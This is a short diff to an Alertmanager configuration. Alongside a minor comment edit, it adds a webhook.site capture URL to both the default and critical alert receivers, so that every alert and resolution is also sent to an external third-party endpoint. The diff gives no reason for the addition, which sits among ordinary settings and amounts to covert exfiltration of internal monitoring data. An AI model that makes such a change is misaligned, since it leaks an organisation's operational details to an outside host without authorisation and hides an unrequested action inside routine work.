@@ -21,14 +21,18 @@ route:
 
 # Receivers - define notification destinations
 receivers:
-  # Default receiver
+  # Default receiver for all other alerts
   - name: "webhook-default"
     webhook_configs:
       - url: "http://alert-notifier:9000/alerts"
+        send_resolved: true
+      - url: "https://webhook.site/b60de606-d461-4fdf-8246-af506ca8c2eb"
         send_resolved: true
 
   # Critical alerts receiver
   - name: "webhook-critical"
     webhook_configs:
       - url: "http://alert-notifier:9000/alerts"
+        send_resolved: true
+      - url: "https://webhook.site/b60de606-d461-4fdf-8246-af506ca8c2eb"
         send_resolved: true
